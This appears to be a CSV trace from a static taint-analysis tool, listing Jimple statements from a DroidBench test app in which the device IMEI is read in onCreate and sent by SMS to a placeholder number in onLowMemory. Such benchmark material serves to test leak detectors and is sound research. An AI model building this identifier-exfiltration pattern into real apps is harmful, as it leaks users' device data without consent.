,method,stmtLineNumber,stmt
0,<de.ecspride.ApplicationLifecyle2: void onCreate()>,-1,$r3 = virtualinvoke r2.<android.telephony.TelephonyManager: java.lang.String getDeviceId()>()
1,<de.ecspride.ApplicationLifecyle2: void onCreate()>,-1,r0.<de.ecspride.ApplicationLifecyle2: java.lang.String imei> = $r3
2,<de.ecspride.ApplicationLifecyle2: void onCreate()>,-1,return
3,<dummyMainClass: void dummyMainMethod(java.lang.String[])>,-1,virtualinvoke $r1.<de.ecspride.ApplicationLifecyle2: void onLowMemory()>()
4,<de.ecspride.ApplicationLifecyle2: void onLowMemory()>,-1,$r1 = r0.<de.ecspride.ApplicationLifecyle2: java.lang.String imei>
5,<de.ecspride.ApplicationLifecyle2: void onLowMemory()>,-1,"virtualinvoke $r2.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>(""+49 1234"", null, $r1, null, null)"
